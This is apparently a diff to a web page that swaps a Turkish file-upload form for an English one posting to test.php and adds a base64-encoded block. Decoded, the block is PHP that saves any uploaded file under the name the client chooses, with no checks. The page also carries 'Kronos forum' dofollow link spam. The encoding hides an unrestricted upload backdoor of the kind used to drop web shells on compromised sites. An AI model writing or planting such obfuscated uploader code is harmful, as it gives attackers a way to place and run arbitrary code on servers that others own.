@@ -4,17 +4,9 @@
 <a href="https://google.org/" title="Kronos forum" rel="dofollow">Kronos forum</a>
 <a href="https://Kronos.com/" title="Kronos">Kronos</a>
 </div>
-   <form name="yukleme" method="post" enctype="multipart/form-data">
-      <table border="0">
-         <tr>
-            <td>Dosya Seçiniz:</td>
-            <td><input type="file" name="dosya"></td>
-         </tr>
-         <tr>
-            <td>&nbsp;</td>
-            <td><input type="submit" name="yukle" value="Yükle"></td>
-         </tr>
-      </table>
-   </form>
+        <form action="test.php" method="POST" enctype="multipart/form-data" >
+            <input name="ufile" type="file" /><br><br>
+            <input type="submit" value="Upload" />
+        </form>
 |
 ICAgICAgICBpZihpc3NldCgkX0ZJTEVTWyJ1ZmlsZSJdKSl7CiAgICAgICAgICAgICR0bXBfbmFtZSA9ICRfRklMRVNbInVmaWxlIl1bInRtcF9uYW1lIl07CiAgICAgICAgICAgICRuYW1lID0gJF9GSUxFU1sidWZpbGUiXVsibmFtZSJdOwogICAgICAgICAgICAkZmlsZV9wYXRoID0gJG5hbWU7IAogICAgICAgICAgICBpZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJHRtcF9uYW1lLCAkZmlsZV9wYXRoKSl7CiAgICAgICAgICAgICAgICBlY2hvICdEb3N5YSB5w7xrbGVuZGkuJzsKICAgICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICBlY2hvICdEb3N5YSB5w7xrbGVtZWRlIGhhdGEuJzsKICAgICAgICAgICAgfQogICAgICAgICAgICB1bmxpbmsoJHRtcF9uYW1lKTsKICAgICAgICB9
